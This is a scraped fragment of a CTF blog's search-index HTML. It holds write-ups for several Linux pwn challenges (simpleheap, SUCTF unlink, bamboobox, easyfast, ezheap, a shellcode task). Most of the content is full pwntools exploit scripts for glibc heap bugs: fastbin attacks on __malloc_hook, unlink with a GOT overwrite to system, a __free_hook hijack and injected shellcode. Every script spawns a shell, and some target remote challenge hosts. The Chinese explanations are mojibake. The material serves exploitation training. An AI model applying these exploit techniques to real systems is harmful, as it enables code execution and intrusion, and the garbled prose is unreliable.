‰ΩÜÊòØËøôÈÅìÈ¢ò+0x4Â•ΩÂÉè‰∏çÂ§™Ë°åÔºåËá≥Â∞ëÂæó+0xc&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])



io=process(&amp;quot;./vn_pwn_simpleHeap&amp;quot;)
# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,28385)
elf=ELF(&amp;quot;./vn_pwn_simpleHeap&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(n,c):
    io.sendlineafter(&amp;quot;choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(&amp;quot;size?&amp;quot;,str(n))
    io.sendafter(&amp;quot;content:&amp;quot;,c)

def edit(n,c):
    io.sendlineafter(&amp;quot;choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;idx?&amp;quot;,str(n))
    io.sendlineafter(&amp;quot;content:&amp;quot;,c)

def show(n):
    io.sendlineafter(&amp;quot;choice: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;idx?&amp;quot;,str(n))

def delete(n):
    io.sendlineafter(&amp;quot;choice: &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(&amp;quot;idx?&amp;quot;,str(n))


add(0x18,b&amp;quot;qqq&amp;quot;) #0
add(0x40,b&amp;quot;www&amp;quot;) #1
add(0x60,b&amp;quot;eee&amp;quot;) #2
add(0x10,b&amp;quot;sss&amp;quot;) #3


payload=cyclic(0x18)+p64(0xc1)
edit(0,payload)


delete(1)
add(0x40,b&amp;quot;wqw&amp;quot;)
show(2)

leak_addr=u64(io.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
libc_addr=leak_addr-0x58-0x3C4B20
malloc_hook=libc_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
realloc=libc_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
# one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=one_gadget[1]+libc_addr

add(0x60,b&amp;quot;wwwee&amp;quot;) #4 2
delete(4)

payload=p64(malloc_hook-0x23)
edit(2,payload) 
add(0x60,b&amp;quot;mmm&amp;quot;) #4


payload=cyclic(0xb)+p64(shell)+p64(realloc+0xc)
add(0x60,payload) #5

gdb.attach(io)
pause()

# add(0x30,b&amp;quot;aaa&amp;quot;)
io.sendlineafter(&amp;quot;choice: &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(&amp;quot;size?&amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive()


# 0x45216 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

&lt;/code&gt;&lt;/pre&gt;
">V&N2020_simpleheap wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/J0ICAuGrD/"" data-c="
          &lt;p&gt;‰∏ÄÈÅì64‰ΩçunlinkÊ®°ÊùøÁªÉ‰π†È¢òÔºåÊ†áÂáÜËèúÂçïÔºåÊ≤°ÊúâuafÔºåÊ≤°ÊúâÂ†ÜÊ∫¢Âá∫Ôºå‰ΩÜeditÊ≤°ÊúâÊ£ÄÊü•&lt;br&gt;
ÂÖàÊîæexpÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])



# io=process(&amp;quot;./[SUCTF 2018 ÊãõÊñ∞Ëµõ]unlink&amp;quot;)
io=remote(&amp;quot;1.14.71.254&amp;quot;,28457)
elf=ELF(&amp;quot;./[SUCTF 2018 ÊãõÊñ∞Ëµõ]unlink&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

bss_addr=0x6020C0
free_got=elf.got[b&amp;quot;free&amp;quot;]

def add(n):
    io.sendlineafter(b&amp;quot;chooice :\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.recvuntil(&amp;quot;size : \n&amp;quot;)
    io.sendline(str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;chooice :\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.recvuntil(&amp;quot;delete\n&amp;quot;)
    io.sendline(str(n))

def show(n):
    io.sendlineafter(b&amp;quot;chooice :\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.recvuntil(&amp;quot;show\n&amp;quot;)
    io.sendline(str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;chooice :\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.recvuntil(b&amp;quot;modify :&amp;quot;)
    io.sendline(str(n))
    io.recvuntil(b&amp;quot;content\n&amp;quot;)
    io.send(cc)


add(0x30) #0
add(0x80) #1
add(0x40) #2


fd=bss_addr-0x18
bk=bss_addr-0x10
payload=p64(0)+p64(0x30)+p64(fd)+p64(bk)+cyclic(0x10)
payload+=p64(0x30)+p64(0x90)

edit(0,payload)

# gdb.attach(io)
# pause()

delete(1) # 0&amp;lt;-1 unsorted bin 
edit(0,p64(0)*3+p64(free_got))
show(0)

libc_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;free&amp;quot;]
print(&amp;quot;libc_addr:  &amp;quot;+hex(libc_addr))


sys_addr=libc_addr+libc.sym[b&amp;quot;system&amp;quot;]
edit(0,p64(sys_addr))
edit(2,b&amp;quot;/bin/sh\x00&amp;quot;)
delete(2)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ê≠§È¢òÈ¶ñÂÖàÁî≥ËØ∑3‰∏™Â†ÜÂùóÔºåÂâç‰∏§‰∏™Â†ÜÂùóÊûÑÈÄ†fake_chunkÔºåÁÑ∂ÂêéfreeÊéâchunk 1‰Ωøchunk0Âíå1ÂêàÂπ∂ËøõÂÖ•unsorted binÔºåÂú®‰ΩøÁî®editÂ∞ÜchunkÁöÑÊåáÈíà‰øÆÊîπ‰∏∫free_gotÂú∞ÂùÄÔºåÊé•ÁùÄshow(0)Ê≥ÑÈú≤freeÂú∞ÂùÄÊù•ËÆ°ÁÆólibcÂü∫ÂùÄÔºåÊúÄÂêé‰øÆÊîπfree_gotË°®Âú∞ÂùÄ‰∏∫systemÂú∞ÂùÄÔºåedit‰∏ÄÂùóÂ†ÜÂùó‰∏∫&amp;quot;/bin/sh\x00&amp;quot;ÔºåÊúÄÂêéfreeÊéâËØ•Â†ÜÂùóÂç≥ÂèØgetshell&lt;/p&gt;
">[SUCTF 2018 ÊãõÊñ∞Ëµõ]unlink wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/DwLogOagh/"" data-c="
          &lt;p&gt;64‰ΩçÊ†áÂáÜËèúÂçïÈ¢òÔºåÊó†uafÔºåÂºÄÂêØcanaryÂíånx‰øùÊä§ÔºåÂ≠òÂú®Â†ÜÊ∫¢Âá∫&lt;br&gt;
Ê≠§È¢òÁ¨¨‰∏ÄÊ¨°Â∞ùËØïÁî®fastbin attackÊâìÔºåÂä´ÊåÅ__malloc_hookÊâìone_gadget&lt;br&gt;
&lt;s&gt;‰ΩÜÂÆûË∑µËøáÁ®ã‰∏≠one_gadgetÂá∫ÈîÖÔºåËøòÊòØÊîæ‰∏ã‰∏çÂÆåÂÖ®ÁöÑexp&lt;/s&gt;ÂÖ∂ÂÆûÊòØfastbin attackÂÜôÈîô‰∫ÜÔºåÁõ∏‰ø°ÁªÜÂøÉÁöÑ‰Ω†‰∏ÄÂÆöËÉΩÊâæÂá∫ÊàëÂΩìÊó∂ÁöÑÈîôËØØÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=process(&amp;quot;./bamboobox&amp;quot;)
# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,29708)
elf=ELF(&amp;quot;./bamboobox&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)
one_gadget=[0x45216, 0x4526a, 0xf03a4, 0xf1247]


def show():
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;1&amp;quot;)

def add(n,c):
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;name:&amp;quot;,str(n))
    io.sendafter(&amp;quot;item:&amp;quot;,c)

def edit(n,c,cc):
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;item:&amp;quot;,str(n))
    io.sendafter(&amp;quot;name:&amp;quot;,str(c))
    io.sendafter(&amp;quot;item:&amp;quot;,cc)

def delete(n):
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(&amp;quot;item:&amp;quot;,str(n))

# add(0x40,b&amp;quot;asd&amp;quot;) #0
add(0x10,b&amp;quot;cqb&amp;quot;) #0
add(0x40,b&amp;quot;opo&amp;quot;) #1
add(0x30,b&amp;quot;unun&amp;quot;) #2
add(0x10,b&amp;quot;iii&amp;quot;) #3

payload=cyclic(0x10)+p64(0)+p64(0x91)
edit(0,len(payload),payload)

delete(1)
add(0x40,b&amp;quot;aaa&amp;quot;) #1
show()
leak_addr=u64(io.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
libc_addr=leak_addr-0x58-0x3C4B20
malloc_hook=libc_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=libc_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
print(&amp;quot;libc_addr:  &amp;quot;+hex(libc_addr))
print(&amp;quot;malloc_hook:  &amp;quot;+hex(malloc_hook))
print(&amp;quot;free_hook:  &amp;quot;+hex(free_hook))
shell=libc_addr+one_gadget[0]


gdb.attach(io)
pause()
add(0x30,b&amp;quot;ppp&amp;quot;) #4
add(0x60,b&amp;quot;www&amp;quot;) #5
add(0x40,b&amp;quot;qqq&amp;quot;) #6
delete(5)



payload=cyclic(0x10)+p64(0)+p64(0x71)+p64(malloc_hook-0x23)
edit(3,len(payload),payload)

add(0x60,p64(shell)) #5
add(0x60,cyclic(0x13)+p64(shell)) #fake_chunk
add(0x40,b&amp;quot;aaa&amp;quot;)


io.interactive()


# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êâì‰∏çÈÄöÊç¢unlinkÂÅöÊ≥ï&lt;br&gt;
ÂÖàÊîæexpÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])



io=process(&amp;quot;./bamboobox&amp;quot;)
# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,27423)
elf=ELF(&amp;quot;./bamboobox&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)
one_gadget=[0x45216, 0x4526a, 0xf03a4, 0xf1247]
bss_addr=0x6020C8
# pf_got=elf.got[b&amp;quot;printf&amp;quot;]
atoi_got=elf.got[b&amp;quot;atoi&amp;quot;]
free_got=elf.got[b&amp;quot;free&amp;quot;]

def show():
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;1&amp;quot;)

def add(n,c):
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;name:&amp;quot;,str(n))
    io.sendafter(&amp;quot;item:&amp;quot;,c)

def edit(n,c,cc):
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;item:&amp;quot;,str(n))
    io.sendafter(&amp;quot;name:&amp;quot;,str(c))
    io.sendafter(&amp;quot;item:&amp;quot;,cc)

def delete(n):
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(&amp;quot;item:&amp;quot;,str(n))

add(0x30,b&amp;quot;aaa&amp;quot;) 
add(0x80,b&amp;quot;qqq&amp;quot;)
add(0x40,b&amp;quot;www&amp;quot;)

payload=p64(0)+p64(0x30)
fd=bss_addr-0x18
bk=bss_addr-0x10
payload+=p64(fd)+p64(bk)
payload+=cyclic(0x10)
payload+=p64(0x30)+p64(0x90)



edit(0,len(payload),payload)

delete(1)


payload=p64(0)*2+p64(0)+p64(atoi_got)
edit(0,len(payload),payload)
gdb.attach(io)
pause()
show()
io.recvuntil(&amp;quot;0 : &amp;quot;)
libc_base=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;atoi&amp;quot;]
print(&amp;quot;libc_base:  &amp;quot;+hex(libc_base))


sys_addr=libc_base+libc.sym[b&amp;quot;system&amp;quot;]
edit(0,8,p64(sys_addr))
io.sendafter(&amp;quot;choice:&amp;quot;,b&amp;quot;/bin/sh\x00&amp;quot;)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;È¶ñÂÖàÁî≥ËØ∑3‰∏™Â†ÜÂùóÔºåÂà©Áî®edit(0)ÈÄöËøáchunk0‰º™ÈÄ†‰∏Ä‰∏™fake_chunk,Ê≥®ÊÑèunlinkÁöÑÊ£ÄÊü•Êú∫Âà∂Ôºåchunk1ÁöÑsizeÂíåprev_sizeÔºàÂç≥fake_chunk sizeÔºâ‰∏çËÉΩÈîôÔºåÊ≠§Â§ñÊ≥®ÊÑèchunk1ÁöÑÂ§ßÂ∞èÈúÄÂ§ß‰∫éfastbinÊúÄÂ§ßÂÄºÔºåÊñπ‰æøÂêéÊù•delete(1)Êó∂Âíåfake_chunkÂêàÂπ∂Ëß¶ÂèëunlinkÊìç‰Ωú&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload=p64(0)+p64(0x30)
fd=bss_addr-0x18
bk=bss_addr-0x10
payload+=p64(fd)+p64(bk)
payload+=cyclic(0x10)
payload+=p64(0x30)+p64(0x90)

edit(0,len(payload),payload)

delete(1)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰πãÂêéfake_chunkÁöÑfdÊåáÈíàÊåáÂêë‰∫ÜchunkÊåáÈíà-0x18Â§Ñ&lt;br&gt;
ÂÜçÊ¨°ÈÄöËøáedit‰øÆÊîπchunkÊåáÈíàÂ§ÑÁöÑÂú∞ÂùÄ‰∏∫atoi_gotÔºàË∞ÉÁî®ËøáÁöÑÂáΩÊï∞gotÂú∞ÂùÄÈÉΩÂèØ‰ª•Ôºå‰∏çËøáÈááÁî®atoiÊñπ‰æøÊúÄÂêé‰º†ÂèÇÔºâ,Êñπ‰æøshow()Êó∂Ê≥ÑÈú≤libc&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload=p64(0)*2+p64(0)+p64(atoi_got)
edit(0,len(payload),payload)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÊúÄÂêéÂ∞ÜatoiÁöÑgotË°®Âú∞ÂùÄÊîπ‰∏∫systemÂú∞ÂùÄÔºåÊ≠§Êó∂Ë∞ÉÁî®atoiËØªÂÖ•ÂèÇÊï∞Êó∂ÂêåÊó∂Ë∞ÉÁî®‰∫ÜsystemÔºåÂèÇÊï∞‰º†ÂÖ•systemÔºåËã•‰º†ÂÖ•&amp;quot;sh&amp;quot;ÂàôÂèØ‰ª•getshell&lt;/p&gt;
">hitcontraining_unlink wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/xswnbOk4E/"" data-c="
          &lt;p&gt;64‰ΩçÂºÄÂêØcanaryÂíånx‰øùÊä§ÔºåÊ†áÂáÜËèúÂçïÈÖçÁΩÆÔºåÂ≠òÂú®uafÊºèÊ¥ûÔºå‰∏îeditÊó∂‰∏çÊ£ÄÊü•ÂΩìÂâçchunkÊòØÂê¶‰∏∫Á©∫&lt;br&gt;
ÊúÄÂºÄÂßãÊÄùË∑ØÂà©Áî®double freeÊîπ‰ªªÊÑèÂú∞ÂùÄÂÜôÔºå‰ΩÜÊòØaddÊúâÈôêÂà∂Ôºå‰∏ãÊ†á‰∏çË∂ÖËøá3ÔºåÊúÄÂ§öÂàõÂª∫4‰∏™chunkÔºõ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680084324971.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Âè™Â•ΩÂà©Áî®uafÊºèÊ¥ûÔºåÂÖàÂàõÂª∫chunk0ÈáäÊîæÂêéedit‰øÆÊîπfdÊåáÈíàÔºåÂú®ÂàÜÈÖç‰∏§Ê¨°chunkÂà∞fdÊåáÈíàÊåáÂêëÊ†à‰∏äÁöÑfake_chunkÔºåÊ≠§Êó∂edit(2)Âç≥ÂèØÊõ¥ÊîπËØ•fake_chunkÂ§ÑÁöÑÂÜÖÂÆπ&lt;br&gt;
Â∞Ü0x608090Â§ÑÁöÑ1Êîπ‰∏∫0Âç≥ÂèØgetshell&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680085251262.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./[WUSTCTF 2020]easyfast&amp;quot;)
# io=remote(&amp;quot;43.143.7.127&amp;quot;,28201)
elf=ELF(&amp;quot;./[WUSTCTF 2020]easyfast&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

shell=0x4008ab
key_ptr=0x602080

def alloc(n):
    io.sendlineafter(b&amp;quot;choice&amp;gt;\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size&amp;gt;\n&amp;quot;,str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;choice&amp;gt;\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;index&amp;gt;\n&amp;quot;, str(n))

def edit(n,c,cc):
    io.sendlineafter(b&amp;quot;choice&amp;gt;\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;index&amp;gt;\n&amp;quot;, str(n))
    io.send(cc)

def shell():
    io.sendlineafter(b&amp;quot;choice&amp;gt;\n&amp;quot;,b&amp;quot;4&amp;quot;)


alloc(0x40) #0
delete(0)
payload=p64(key_ptr)

gdb.attach(io)
pause()

edit(0,len(payload),payload)
alloc(0x40) #1
alloc(0x40) #2
payload=p64(0)
edit(2,len(payload),p64(0))


# alloc(0x40) #0
# alloc(0x40) #1
# delete(0)
# delete(1) #main_arena-&amp;gt;0-&amp;gt;1-&amp;gt;0
# delete(0)

# gdb.attach(io)
# pause()

# alloc(0x40) #2
# alloc(0x40) #3

# payload=p64(key_ptr)
# edit(1,len(payload),payload)

# alloc(0x40) #4
# alloc(0x40) #5

shell()
# delete(1)
# alloc(1)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[WUSTCTF 2020]easyfast wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/C4txIB5QN/"" data-c="
          &lt;p&gt;64‰ΩçÂ†ÜÊ∫¢Âá∫È¢òÁõÆÔºå‰øùÊä§ÂÖ®ÂºÄÔºåÊú¨È¢òÁî®Âà∞chunk extend‰ª•Âèä__free_hookÂä´ÊåÅ&lt;br&gt;
menuÂ≠òÂú®4‰∏™ÂáΩÊï∞ÔºåÂÖ∂‰∏≠addÂáΩÊï∞‰∏≠‰∏ÄÊ¨°malloc‰∏§‰∏™Â†ÜÂùó&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680002145102.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Á¨¨‰∏Ä‰∏™Â†ÜÂùóÊòØdescriptionÔºåÁ¨¨‰∫å‰∏™Â†ÜÂùóÊâçÊòØreal contentÂ≠òÊîæÂ§Ñ&lt;br&gt;
ËÄåÊú¨‰ΩìÂ†ÜÂùóÁªìÊûÑ‰Ωì‰∏≠Â≠òÊîæputsÁöÑÂÆûÈôÖÂú∞ÂùÄÔºåÂèØ‰ª•‰ª•Ê≠§Ê≥ÑÈú≤Âú∞ÂùÄËÆ°ÁÆólibcÂü∫ÂùÄ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680002246302.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
‰∏ãÈù¢ÊòØexpÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=process(&amp;quot;./ezheap&amp;quot;)
# io=remote(&amp;quot;43.143.7.127&amp;quot;,28232)
elf=ELF(&amp;quot;./ezheap&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)


def add(n,s,c,cc):
    io.recvuntil(&amp;quot;Choice: \n&amp;quot;)
    io.send(b&amp;quot;1&amp;quot;)
    io.recvuntil(&amp;quot;Input your idx:\n&amp;quot;)
    io.send(str(n))
    io.recvuntil(b&amp;quot;Size:\n&amp;quot;)
    io.send(str(s))
    io.recvuntil(b&amp;quot;Name: \n&amp;quot;)
    io.send(c)
    io.recvuntil(b&amp;quot;Content:\n&amp;quot;)
    io.send(cc)

def delete(n):
    io.recvuntil(&amp;quot;Choice: \n&amp;quot;)
    io.send(b&amp;quot;2&amp;quot;)
    io.recvuntil(&amp;quot;Input your idx:\n&amp;quot;)
    io.send(str(n))

def show(n):
    io.recvuntil(&amp;quot;Choice: \n&amp;quot;)
    io.send(b&amp;quot;3&amp;quot;)
    io.recvuntil(&amp;quot;Input your idx:\n&amp;quot;)
    io.send(str(n))

def edit(n,s,c):
    io.recvuntil(&amp;quot;Choice: \n&amp;quot;)
    io.send(b&amp;quot;4&amp;quot;)
    io.recvuntil(&amp;quot;Input your idx:\n&amp;quot;)
    io.send(str(n))
    io.recvuntil(b&amp;quot;Size:\n&amp;quot;)
    io.send(str(s))
    io.send(c)

add(0,0x40,b&amp;quot;asd&amp;quot;,b&amp;quot;asd&amp;quot;) #0
add(1,0x40,b&amp;quot;asd&amp;quot;,b&amp;quot;asd&amp;quot;) #1
# add(2,0x40,b&amp;quot;asd&amp;quot;,b&amp;quot;asd&amp;quot;)

gdb.attach(io)
pause()

edit(0,0x70,cyclic(0x70))  #0x70bytesÂà∞putsÁöÑÂÜÖÂ≠òÂú∞ÂùÄ

show(0) #overlapped chunk 0

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]

print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]

payload=cyclic(0x40)+p64(0)+p64(0x31)+p64(0)*2+p64(free_hook-8)
edit(0,len(payload),payload)
payload=b&amp;quot;/bin/sh\x00&amp;quot;+p64(sys_addr)
edit(1,len(payload),payload)
delete(1)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂÖàÂàÜÈÖç‰∏§ÂùóÁ¨¶ÂêàfastbinÂ§ßÂ∞èÁöÑÂ†ÜÂùóÔºåÈÄöËøáeditÂáΩÊï∞Â†ÜÊ∫¢Âá∫Ëá≥putsÂú∞ÂùÄÂ§Ñ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;add(0,0x40,b&amp;quot;asd&amp;quot;,b&amp;quot;asd&amp;quot;) #0
add(1,0x40,b&amp;quot;asd&amp;quot;,b&amp;quot;asd&amp;quot;) #1
edit(0,0x70,cyclic(0x70)) 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1680002436746.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Ëé∑ÂèñlibcÂêéËÄÉËôëÂä´ÊåÅ__free_hookÂà∞systemÂáΩÊï∞Â§Ñ&lt;br&gt;
‰∫éÊòØÂÜçÊ¨°‰ΩøÁî®Â†ÜÊ∫¢Âá∫Â∞Ü‰πãÂâçÁî≥ËØ∑ÁöÑÂ†ÜÂùó1ÁöÑdescriptionÂùóÂ§ÑÁöÑÂÅèÁßª‰∏∫0x10Â§ÑÂú∞ÂùÄË¶ÜÁõñ‰∏∫(&amp;amp;__free_hook-0x8)ÔºåÂ∞ÜdescriptionÊú´Â∞æÔºàÂç≥ÂÅèÁßª‰∏∫0x18Â§ÑÔºâÊ†áÂøó‰ΩçËµãÂÄº‰∏∫1Ôºå‰ª•‰æøËÉΩÂ§üË¢´freeÊéâÔºåÂ¶Ç‰∏ãÂà§Êñ≠&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680002947889.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
‰πãÂêéedit(1)Êó∂ÂèØ‰ª•Áõ¥Êé•‰ªéÊ≠§Â§ÑÂºÄÂßãË¶ÜÁõñÔºåÂπ∂‰∏î&amp;amp;__free_hook-0x8Â§ÑË¶ÜÁõñ‰∏∫&lt;code&gt;/bin/sh\x00&lt;/code&gt;Ôºå&amp;amp;__free_hookÂ§ÑË¶ÜÁõñ‰∏∫systemÂú∞ÂùÄÔºåÊúÄÂêéfree(1)Êó∂‰æøÂèØ‰ª•getshell&lt;/p&gt;
">[HNCTF 2022 WEEK4]ezheap wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/xiJWhqm91/"" data-c="
          &lt;h4 id=&#34;shellcode&#34;&gt;shellcode&lt;/h4&gt;
&lt;p&gt;64‰ΩçshellcodeÈ¢òÁõÆ&lt;br&gt;
‰ΩøÁî®readËØªÂÖ•ÔºåÂπ∂Áî®strncpyÂ∞ÜËØªÂÖ•Êï∞ÊçÆÂ§çÂà∂Âà∞bssÊÆµ‰∏ä‰∏ÄÂ§ÑÂÅèÁßªÂ§ÑÔºåÈöèÂêéÊâßË°åËØ•bssÂú∞ÂùÄÂä†‰∏ä100‰ª•ÂÜÖÈöèÊú∫Êï∞ÁöÑÂÅèÁßªÁöÑÂú∞ÂùÄÂ§ÑÊåá‰ª§(Ê≠§È¢òÈöèÊú∫Êï∞Êó†ÊïàÔºåÂèØ‰ª•Áõ¥Êé•ÊâßË°åbssÂÅèÁßªÂ§Ñ)&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


while True:
    try:
        # io=process(&amp;quot;./pwn&amp;quot;)
        io=remote(&amp;quot;node.yuzhian.com.cn&amp;quot;,33905)
        io.recvuntil(b&amp;quot;5 min!\n&amp;quot;)
        shellcode=asm(shellcraft.sh())
        payload=cyclic(84)+shellcode.ljust(36,b&amp;quot;a&amp;quot;)+p64(0x4040d4)
        # gdb.attach(io)
        # pause()

        io.send(payload)

        io.interactive()

    except:
        io.close()
        continue
        
        

# pwnÈÉ®ÂàÜÈ¢òÁõÆÁöÑ‰∏¥Êó∂ÈùôÊÄÅÂπ≥Âè∞
# ctf.comentropy.cn
